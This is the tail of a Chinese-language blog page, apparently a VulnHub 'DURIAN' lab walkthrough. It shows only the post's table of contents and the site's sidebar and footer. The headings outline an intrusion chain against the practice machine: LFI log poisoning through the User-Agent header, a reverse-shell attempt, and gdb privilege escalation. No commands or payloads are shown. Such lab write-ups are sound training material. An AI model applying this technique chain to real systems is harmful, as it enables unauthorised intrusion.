href="#8000-%E7%AB%99%E7%82%B9%E6%98%AF%E4%B8%80%E5%BC%A0%E5%9B%BE%E7%89%87%E9%9C%80%E8%A6%81%E7%9B%AE%E5%BD%95%E6%94%B6%E9%9B%86"><span class="toc-number">5.</span> <span class="toc-text"> 8000 站点是一张图片，需要目录收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89%E5%8F%91%E7%8E%B0%E4%BB%80%E4%B9%88%E6%95%8F%E6%84%9F%E7%9A%84%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">6.</span> <span class="toc-text"> 没有发现什么敏感的目录信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8088-%E9%A1%B5%E9%9D%A2%E4%B9%9F%E6%98%AF%E4%B8%80%E4%B8%AA%E5%9B%BE%E7%89%87%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E7%89%B9%E7%82%B9"><span class="toc-number">7.</span> <span class="toc-text"> 8088 页面也是一个图片，没有什么特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%90%9C%E5%AF%BB%E7%9B%AE%E5%BD%95%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E4%B8%80%E4%BA%9B%E7%89%B9%E6%AE%8A%E7%9A%84%E7%9B%AE%E5%BD%95"><span class="toc-number">8.</span> <span class="toc-text"> 搜寻目录之后发现一些特殊的目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E5%A4%A7%E9%83%A8%E5%88%86%E9%A1%B5%E9%9D%A2%E9%83%BD%E6%98%AF-403-%E6%B2%A1%E6%9C%89%E5%88%A9%E7%94%A8%E7%9A%84%E4%BB%B7%E5%80%BC"><span class="toc-number">9.</span> <span class="toc-text"> 发现大部分页面都是 403 , 没有利用的价值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E4%B8%80%E4%B8%AA%E7%95%8C%E9%9D%A2%E6%9C%89%E7%99%BB%E9%99%86%E6%A1%86%E5%92%8C%E5%AF%86%E7%A0%81%E5%8F%AF%E4%BB%A5%E7%94%A8%E6%9D%A5%E7%88%86%E7%A0%B4"><span class="toc-number">10.</span> <span class="toc-text"> 有一个界面有登陆框和密码，可以用来爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003-lfi%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AF%BB%E6%89%BE%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%BE%80%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E4%B8%AD%E5%86%99%E6%9C%A8%E9%A9%AC"><span class="toc-number">11.</span> <span class="toc-text"> 003 lfi 漏洞利用，寻找日志文件，往日志文件中写木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%BC%E4%B8%8A%E6%98%AF%E8%83%BD%E6%94%B6%E9%9B%86%E5%88%B0%E6%89%80%E6%9C%89%E7%9A%84%E4%BF%A1%E6%81%AF%E7%99%BB%E9%99%86%E6%A1%86%E5%A4%84%E7%94%B1%E4%BA%8E%E7%BC%BA%E5%B0%91%E7%94%A8%E6%88%B7%E5%90%8D%E6%98%AF%E5%BE%88%E9%9A%BE%E7%88%86%E7%A0%B4%E5%87%BA%E6%9D%A5%E7%9A%84"><span class="toc-number">12.</span> <span class="toc-text"> 综上是能收集到所有的信息，登陆框处由于缺少用户名，是很难爆破出来的，</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A2%E7%84%B6%E4%BF%A1%E6%81%AF%E8%83%BD%E5%A4%9F%E8%A2%AB%E4%BF%9D%E5%AD%98%E5%9C%A8%E8%BF%99%E9%87%8C%E5%B0%B1%E7%BB%99%E5%8F%91%E9%80%81%E4%B8%80%E4%B8%AA%E5%B8%A6%E6%9C%A8%E9%A9%AC%E7%9A%84%E4%BF%A1%E6%81%AF%E4%BF%AE%E6%94%B9ua%E5%A4%B4"><span class="toc-number">13.</span> <span class="toc-text"> 既然信息能够被保存在这里，就给发送一个带木马的信息，修改 UA 头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E5%A4%B1%E8%B4%A5%E4%BA%86%E6%B2%A1%E6%9C%89%E4%B8%8B%E8%BD%BD%E6%8F%90%E7%A4%BA%E4%B9%9F%E6%B2%A1%E6%9C%89%E5%90%88%E9%80%82%E7%9A%84%E6%95%B0%E6%8D%AE%E6%8A%A5%E8%BF%94%E5%9B%9E"><span class="toc-number">14.</span> <span class="toc-text"> 但是失败了，没有下载提示，也没有合适的数据报返回</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%B6%E4%B8%94%E4%B9%9F%E4%B8%8D%E8%83%BD%E4%BF%AE%E6%94%B9%E5%8E%9F%E6%9C%89%E7%9A%84%E6%89%80%E6%9C%89%E4%BB%A3%E7%A0%81"><span class="toc-number">15.</span> <span class="toc-text"> 并且也不能修改原有的所有代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%98%E6%98%AF%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%8C%85%E6%9D%A5%E4%B8%8B%E6%89%8B%E5%8F%AF%E8%83%BD%E4%B8%8B%E8%BD%BD%E6%88%90%E5%8A%9F%E4%BA%86%E6%B2%A1%E6%9C%89%E5%9B%9E%E6%98%BE%E7%B4%A2%E6%80%A7%E5%B0%B1%E7%9B%B4%E6%8E%A5%E5%B0%9D%E8%AF%95%E6%89%A7%E8%A1%8C%E6%9C%AC%E5%BA%94%E8%AF%A5"><span class="toc-number">16.</span> <span class="toc-text"> 还是从数据包来下手，可能下载成功了没有回显，索性就直接尝试执行本应该</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E6%B2%A1%E6%9C%89%E5%8F%8D%E5%BC%B9%E5%87%BA%E6%9D%A5%E5%BE%88%E5%A5%87%E6%80%AA"><span class="toc-number">17.</span> <span class="toc-text"> 但是没有反弹出来，很奇怪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#004-%E9%98%B2%E7%81%AB%E5%A2%99%E7%AD%96%E7%95%A5curl%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%91%E5%8C%85linpeas%E6%A3%80%E7%B4%A2gdb%E6%8F%90%E6%9D%83"><span class="toc-number">18.</span> <span class="toc-text"> 004 防火墙策略，curl 自定义发包，linpeas 检索，gdb 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99%E5%86%8D%E6%AC%A1%E6%B5%8B%E8%AF%95"><span class="toc-number">19.</span> <span class="toc-text"> 关闭防火墙，再次测试</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2023/07/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2023/07/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2023/07/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2023/07/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2023/07/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2023/07/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2023/07/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2023/07/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2023/07/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2023/07/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2023/07/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2023/07/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2023/07/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2023/07/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2023/07/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2023/07/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2023/07/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2023/07/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2023/07/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2023/07/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2023/07/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB RIPPER">VULNHUB RIPPER</a></li><li><a href="/2023/07/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB FUNBOX10">VULNHUB FUNBOX10</a></li><li><a href="/2023/07/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB KEYRING">VULNHUB KEYRING</a></li><li><a href="/2023/07/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></li><li><a href="/2023/07/01/VULNHUB/127%20TYPO/" rel="bookmark" title="VULNHUB TYPO">VULNHUB TYPO</a></li><li><a href="/2023/07/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB HACKERKID">VULNHUB HACKERKID</a></li><li><a href="/2023/07/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB SNAKEOIL">VULNHUB SNAKEOIL</a></li><li><a href="/2023/07/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB BLUEMOON">VULNHUB BLUEMOON</a></li><li><a href="/2023/07/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB PRESIDENTIAL">VULNHUB PRESIDENTIAL</a></li><li><a href="/2023/07/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB PROXIMACENTAURI">VULNHUB PROXIMACENTAURI</a></li><li><a href="/2023/07/01/VULNHUB/132%20JETTY/" rel="bookmark" title="VULNHUB JETTY">VULNHUB JETTY</a></li><li><a href="/2023/07/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB GROTESQUE2">VULNHUB GROTESQUE2</a></li><li><a href="/2023/07/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB GROTESQUE1">VULNHUB GROTESQUE1</a></li><li><a href="/2023/07/01/VULNHUB/138%20BLUESOMKE/" rel="bookmark" title="VULNHUB BLUESOMKE">VULNHUB BLUESOMKE</a></li><li><a href="/2023/07/01/VULNHUB/139%20INFERNO/" rel="bookmark" title="VULNHUB INFERNO">VULNHUB INFERNO</a></li><li><a href="/2023/07/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB VENUS">VULNHUB VENUS</a></li><li><a href="/2023/07/01/VULNHUB/140%20LOOZ/" rel="bookmark" title="VULNHUB LOOZ">VULNHUB LOOZ</a></li><li><a href="/2023/07/01/VULNHUB/142%20DARKHOLE2/" rel="bookmark" title="VULNHUB DARKHOLE2">VULNHUB DARKHOLE2</a></li><li><a href="/2023/07/01/VULNHUB/143%20ORASI/" rel="bookmark" title="VULNHUB ORASI">VULNHUB ORASI</a></li><li><a href="/2023/07/01/VULNHUB/144%20CEREAL/" rel="bookmark" title="VULNHUB CEREAL">VULNHUB CEREAL</a></li><li><a href="/2023/07/01/VULNHUB/145%20TORANDO/" rel="bookmark" title="VULNHUB TORANDO">VULNHUB TORANDO</a></li><li><a href="/2023/07/01/VULNHUB/146%20NEMESIS/" rel="bookmark" title="VULNHUB NEMESIS">VULNHUB NEMESIS</a></li><li><a href="/2023/07/01/VULNHUB/148%20GITROOT/" rel="bookmark" title="VULNHUB GITROOT">VULNHUB GITROOT</a></li><li><a href="/2023/07/01/VULNHUB/150%20POWERGRID/" rel="bookmark" title="VULNHUB POWERGRID">VULNHUB POWERGRID</a></li><li class="active"><a href="/2023/07/01/VULNHUB/149%20DURIAN/" rel="bookmark" title="VULNHUB DURIAN">VULNHUB DURIAN</a></li><li><a href="/2023/07/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB MOMENTUM2">VULNHUB MOMENTUM2</a></li><li><a href="/2023/07/01/VULNHUB/133%20GROTESQUE3/" rel="bookmark" title="VULNHUB GROTESQUE3">VULNHUB GROTESQUE3</a></li><li><a href="/2023/07/01/VULNHUB/135%20HACKABLE3/" rel="bookmark" title="VULNHUB HACKABLE3">VULNHUB HACKABLE3</a></li><li><a href="/2023/07/01/VULNHUB/141%20CENGBOX3/" rel="bookmark" title="VULNHUB CENGBOX3">VULNHUB CENGBOX3</a></li><li><a href="/2023/07/01/VULNHUB/147%20WARZONE3/" rel="bookmark" title="VULNHUB WARZONE3">VULNHUB WARZONE3</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt=".N1h1l157"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">.N1h1l157</p>
+  <div class="description" itemprop="description">人生如逆旅，我亦是行人</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">153</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">6</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">39</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL04xaDFsMTU3" title="https:&#x2F;&#x2F;github.com&#x2F;N1h1l157"><i class="ic i-github"></i></span>
+      <span class="exturl item twitter" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9YVDcyNzgwMzA4" title="https:&#x2F;&#x2F;twitter.com&#x2F;XT72780308"><i class="ic i-twitter"></i></span>
+      <span class="exturl item weibo" data-url="aHR0cHM6Ly9tLndlaWJvLmNuL3Byb2ZpbGUvNTgyOTg0MzUyNQ==" title="https:&#x2F;&#x2F;m.weibo.cn&#x2F;profile&#x2F;5829843525"><i class="ic i-weibo"></i></span>
+      <span class="exturl item about" data-url="aHR0cHM6Ly90Lm1lL24xaDFsMTU3" title="https:&#x2F;&#x2F;t.me&#x2F;n1h1l157"><i class="ic i-address-card"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOjEyMjgwNTc4NjlAcXEuY29t" title="mailto:1228057869@qq.com"><i class="ic i-envelope"></i></span>
+      <span class="exturl item facebook" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDA4NDUzNzQwNTEzNw==" title="https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100084537405137"><i class="ic i-facebook"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-clipboard"></i>书架</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/books/LITERATURE/" rel="section"><i class="ic i-fedora"></i>LITERATURE</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/VULNHUB/" rel="section"><i class="ic i-android"></i>X_T-VULNHUB</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/books/XIAODI/" rel="section"><i class="ic i-opera"></i>XIAODI-SAFE</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2023/07/01/VULNHUB/144%20CEREAL/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2023/07/01/VULNHUB/150%20POWERGRID/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%96%87%E5%AD%A6/" title="分类于 文学">文学</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/20%E3%80%8A%E5%B0%91%E5%B9%B4%E7%BB%B4%E7%89%B9%E4%B9%8B%E7%83%A6%E6%81%BC%E3%80%8B%E7%BA%A6%E7%BF%B0%C2%B7%E6%B2%83%E5%B0%94%E5%A4%AB%E5%86%88%C2%B7%E6%AD%8C%E5%BE%B7/" title="《少年维特之烦恼》约翰·沃尔夫冈·歌德">《少年维特之烦恼》约翰·沃尔夫冈·歌德</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/INTJ%E8%A7%A3%E8%AF%BB/" title="INTJ解读">INTJ解读</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/126%20HACKERKID/" title="VULNHUB HACKERKID">VULNHUB HACKERKID</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%B0%8F%E8%AF%B4/" title="分类于 小说">小说</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/7%E3%80%8A%E6%B4%BB%E7%9D%80%E3%80%8B%E4%BD%99%E5%8D%8E/" title="《活着》余华">《活着》余华</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%B0%8F%E8%AF%B4/" title="分类于 小说">小说</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/31%E3%80%8A%E4%BA%BA%E7%94%9F%E3%80%8B%E8%B7%AF%E9%81%A5/" title="《人生》路遥">《人生》路遥</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/121%20RIPPER/" title="VULNHUB RIPPER">VULNHUB RIPPER</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/43%E3%80%8A%E6%88%91%E6%98%AF%E7%8C%AB%E3%80%8B%E5%A4%8F%E7%9B%AE%E6%BC%B1%E7%9F%B3/" title="《我是猫》夏目漱石">《我是猫》夏目漱石</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/VULNHUB/" title="分类于 VULNHUB">VULNHUB</a>
+</div>
+
+    <span><a href="/2023/07/01/VULNHUB/117%20WEBMACHINE/" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/MBTI/" title="分类于 MBTI">MBTI</a>
+</div>
+
+    <span><a href="/2023/04/01/MBTI/%E5%9B%9B%E4%B8%AA%E5%AD%90%E9%87%8F%E8%A1%A8/" title="四个子量表">四个子量表</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E4%B8%96%E7%95%8C%E5%90%8D%E8%91%97/" title="分类于 世界名著">世界名著</a>
+</div>
+
+    <span><a href="/2023/07/01/BOOK/67%E3%80%8A%E8%8B%8F%E8%8F%B2%E7%9A%84%E4%B8%96%E7%95%8C%E3%80%8B%E4%B9%94%E5%BE%B7%E5%9D%A6%C2%B7%E8%B4%BE%E5%BE%B7/" title="《苏菲的世界》乔德坦·贾德">《苏菲的世界》乔德坦·贾德</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">.N1h1l157 @ Phut Hon</span>
+  </div>
+
+<!--   自定义开启一个网站的运行时间 -->
+  <div class="site-uptime">
+    Site uptime: <span id="site-uptime"></span>
+  </div>
+  <script>
+    var siteUptimeElement = document.getElementById('site-uptime');
+    var siteSetupDate = new Date('2023-03-18'); // 替换为您的网站具体创建日期，格式为 'YYYY-MM-DD'
+    setInterval(function() {
+      var currentTime = new Date();
+      var uptime = formatUptime(currentTime - siteSetupDate);
+      siteUptimeElement.textContent = uptime;
+    }, 1000);
+
+    function formatUptime(milliseconds) {
+      var seconds = Math.floor(milliseconds / 1000);
+      var minutes = Math.floor(seconds / 60);
+      var hours = Math.floor(minutes / 60);
+      var days = Math.floor(hours / 24);
+
+      var uptime = '';
+      if (days > 0) {
+        uptime += days + '天 ';
+      }
+      if (hours > 0) {
+        uptime += (hours % 24) + '时 ';
+      }
+      if (minutes > 0) {
+        uptime += (minutes % 60) + '分 ';
+      }
+      uptime += (seconds % 60) + '秒';
+
+      return uptime;
+    }
+  </script>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/07/01/VULNHUB/149 DURIAN/',
+    favicon: {
+      show: "Cryp71c3",
+      hide: "十年磨一剑"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
